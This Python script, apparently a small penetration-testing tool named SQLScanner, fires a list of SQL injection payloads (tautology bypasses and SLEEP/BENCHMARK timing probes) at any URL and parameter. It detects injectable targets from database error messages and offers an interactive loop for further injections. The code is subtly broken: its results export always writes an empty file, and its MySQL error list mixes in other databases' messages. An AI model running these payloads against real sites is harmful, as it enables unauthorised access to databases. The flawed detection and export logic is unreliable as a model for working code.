#!/usr/bin/env python3

import requests
import argparse
import csv
import concurrent.futures

# Default payloads
default_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
    "' OR 'a'='a' #",
    "' OR 'a'='a' /*",
    "' OR 1=1",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 1=1 /*",
    "' OR '1'='1' AND SLEEP(5) --",
    "' OR '1'='1' AND BENCHMARK(1000000,MD5(1)) --",
]

# SQL errors for different databases
db_errors = {
    'MySQL': [
        "You have an error in your SQL syntax;",
        "Warning: mysql_fetch_assoc()",
        "Warning: mysql_num_rows()",
        "Warning: mysql_fetch_array()",
        "Unclosed quotation mark after the character string",
        "Microsoft OLE DB Provider for SQL Server",
        "mysql_num_rows() expects parameter 1 to be resource",
        "supplied argument is not a valid MySQL",
        "ORA-01756",
        "Error: unknown column",
        "Query failed",
        "SQLSTATE",
        "Warning: pg_exec",
        "pg_query(): Query failed",
        "unterminated quoted string",
    ],
    'PostgreSQL': [
        "ERROR: syntax error at or near",
        "pg_query(): Query failed",
    ],
    'MSSQL': [
        "SQL Server does not exist or access denied",
        "OLE DB provider for linked server",
    ],
    # Add more databases as needed
}

def is_vulnerable(response, db_type='MySQL'):
    """Analyze the response to determine if there is a possible SQL injection."""
    for error in db_errors.get(db_type, []):
        if error.lower() in response.text.lower():
            return True
    return False

def make_request(url, param, payload, method='GET', cookies=None):
    """Make a request to the URL with the given payload."""
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    if method == 'POST':
        return session.post(url, data={param: payload})
    elif method == 'PUT':
        return session.put(url, data={param: payload})
    elif method == 'DELETE':
        return session.delete(url, data={param: payload})
    else:
        return session.get(url, params={param: payload})

def test_sql_injection(url, param, payloads, method='GET', cookies=None):
    """Test for SQL Injection vulnerabilities."""
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future_to_payload = {executor.submit(make_request, url, param, payload, method, cookies): payload for payload in payloads}
        for future in concurrent.futures.as_completed(future_to_payload):
            payload = future_to_payload[future]
            try:
                response = future.result()
                if is_vulnerable(response):
                    print(f"Possible SQL Injection vulnerability detected with payload: {payload}")
                    return True
            except Exception as exc:
                print(f'Payload {payload} generated an exception: {exc}')
    return False

def export_results(results, filename='results.csv'):
    """Export results to a CSV file."""
    with open(filename, 'w', newline='') as csvfile:
        fieldnames = ['URL', 'Parameter', 'Payload', 'Vulnerable']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow(result)

def main():
    # Custom startup message
    print("██████╗░██╗░░░░░██╗███╗░░██╗██████╗░███╗░░░███╗░█████╗░░░███╗░░██████╗░███████╗███╗░░██╗")
    print("██╔══██╗██║░░░░░██║████╗░██║██╔══██╗████╗░████║██╔══██╗░████║░░██╔══██╗██╔════╝████╗░██║")
    print("██████╦╝██║░░░░░██║██╔██╗██║██║░░██║██╔████╔██║███████║██╔██║░░██║░░██║█████╗░░██╔██╗██║")
    print("██╔══██╗██║░░░░░██║██║╚████║██║░░██║██║╚██╔╝██║██╔══██║╚═╝██║░░██║░░██║██╔══╝░░██║╚████║")
    print("██████╦╝███████╗██║██║░╚███║██████╔╝██║░╚═╝░██║██║░░██║███████╗██████╔╝███████╗██║░╚███║")
    print("╚═════╝░╚══════╝╚═╝╚═╝░░╚══╝╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚══════╝╚═════╝░╚══════╝╚═╝░░╚══╝")
    print("SQLScanner")
    print("Author: @blindma1den.\n")

    parser = argparse.ArgumentParser(description="SQL Injection vulnerability detector")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/search.php)")
    parser.add_argument("param", help="Parameter to test for SQL Injection")
    parser.add_argument("--method", choices=['GET', 'POST', 'PUT', 'DELETE'], default='GET', help="HTTP method to use")
    parser.add_argument("--cookies", help="Cookies to include in the requests (format: key=value,key=value)")
    parser.add_argument("--custom-payloads", help="File with custom payloads", type=argparse.FileType('r'))
    parser.add_argument("--save-payload", help="Save custom payload to file", type=str)
    parser.add_argument("--export-results", help="Export results to a CSV file", type=str)

    args = parser.parse_args()
    url = args.url
    param = args.param
    method = args.method

    # Convert cookies string to dictionary
    cookies = None
    if args.cookies:
        cookies = dict(cookie.split('=') for cookie in args.cookies.split(','))

    # Load payloads
    payloads = default_payloads
    if args.custom_payloads:
        payloads = [line.strip() for line in args.custom_payloads]

    print(f"Testing {url} for SQL Injection vulnerabilities on parameter '{param}' with method '{method}'...")

    results = []
    if test_sql_injection(url, param, payloads, method, cookies):
        print("The site is vulnerable to SQL Injection.")
        while True:
            option = input("Do you want to test more injections? (y/n): ").strip().lower()
            if option == 'n':
                break
            elif option == 'y':
                custom_payload = input("Enter the SQL injection to test: ").strip()
                if test_sql_injection(url, param, [custom_payload], method, cookies):
                    print(f"The custom payload '{custom_payload}' is vulnerable.")
                    if args.save_payload:
                        with open(args.save_payload, 'a') as file:
                            file.write(custom_payload + '\n')
                        print(f"Payload '{custom_payload}' saved to {args.save_payload}.")
                else:
                    print(f"The custom payload '{custom_payload}' is not vulnerable.")
            else:
                print("Invalid option. Please enter 'y' or 'n'.")
    else:
        print("No SQL Injection vulnerabilities detected.")

    # Export results if needed
    if args.export_results:
        export_results(results, args.export_results)
        print(f"Results exported to {args.export_results}.")

if __name__ == "__main__":
    main()
